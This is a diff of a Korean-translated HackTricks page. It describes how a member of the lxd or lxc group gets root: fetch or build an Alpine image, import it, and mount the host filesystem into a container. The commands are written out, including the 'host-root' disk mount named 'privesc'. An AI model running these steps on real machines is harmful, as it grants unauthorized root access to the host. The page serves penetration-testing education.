@@ -2,24 +2,29 @@
 
 {{#include ../../../banners/hacktricks-training.md}}
 
-_if you belong to_ _**lxd**_ **or** _**lxc**_ **group**, you can become root_
+당신이 _**lxd**_ **또는** _**lxc**_ **그룹**에 속한다면, 루트가 될 수 있습니다.
 
 ## 인터넷 없이 악용하기
 
 ### 방법 1
 
-You can install in your machine this distro builder: [https://github.com/lxc/distrobuilder ](https://github.com/lxc/distrobuilder)(follow the instructions of the github):
+신뢰할 수 있는 저장소에서 lxd와 함께 사용할 alpine 이미지를 다운로드할 수 있습니다.  
+Canonical은 그들의 사이트에 매일 빌드를 게시합니다: [https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/](https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/)  
+가장 최신 빌드에서 **lxd.tar.xz**와 **rootfs.squashfs**를 모두 가져오세요. (디렉토리 이름은 날짜입니다).
+
+대안으로, 이 배포판 빌더를 당신의 머신에 설치할 수 있습니다: [https://github.com/lxc/distrobuilder](https://github.com/lxc/distrobuilder) (github의 지침을 따르세요):
 ```bash
-sudo su
 # Install requirements
 sudo apt update
-sudo apt install -y git golang-go debootstrap rsync gpg squashfs-tools
+sudo apt install -y golang-go gcc debootstrap rsync gpg squashfs-tools git make build-essential libwin-hivex-perl wimtools genisoimage
 
 # Clone repo
+mkdir -p $HOME/go/src/github.com/lxc/
+cd $HOME/go/src/github.com/lxc/
 git clone https://github.com/lxc/distrobuilder
 
 # Make distrobuilder
-cd distrobuilder
+cd ./distrobuilder
 make
 
 # Prepare the creation of alpine
@@ -27,13 +32,10 @@ mkdir -p $HOME/ContainerImages/alpine/
 cd $HOME/ContainerImages/alpine/
 wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml
 
-# Create the container
-## Using build-lxd
-sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml -o image.release=3.18
-## Using build-lxc
-sudo $HOME/go/bin/distrobuilder build-lxc alpine.yaml -o image.release=3.18
+# Create the container - Beware of architecture while compiling locally.
+sudo $HOME/go/bin/distrobuilder build-incus alpine.yaml -o image.release=3.18 -o image.architecture=x86_64
 ```
-파일 **lxd.tar.xz**와 **rootfs.squashfs**를 업로드하고, 이미지를 레포지토리에 추가한 후 컨테이너를 생성합니다:
+파일 **incus.tar.xz** (**Canonical 리포지토리에서 다운로드한 경우 **lxd.tar.xz**)와 **rootfs.squashfs**를 업로드하고, 이미지를 리포지토리에 추가한 후 컨테이너를 생성하세요:
 ```bash
 lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
 
@@ -49,8 +51,8 @@ lxc list
 lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
 ```
 > [!CAUTION]
-> 이 오류 _**Error: No storage pool found. Please create a new storage pool**_를 발견하면\
-> **`lxd init`**를 실행하고 **이전 명령어 조각을 반복**하세요.
+> 이 오류를 발견하면 _**오류: 저장소 풀이 없습니다. 새 저장소 풀을 생성하십시오**_\
+> **`lxd init`**를 실행하고 모든 옵션을 기본값으로 설정하십시오. 그런 다음 **이전 명령어 덩어리를 반복하십시오**.
 
 마지막으로 컨테이너를 실행하고 root를 얻을 수 있습니다:
 ```bash
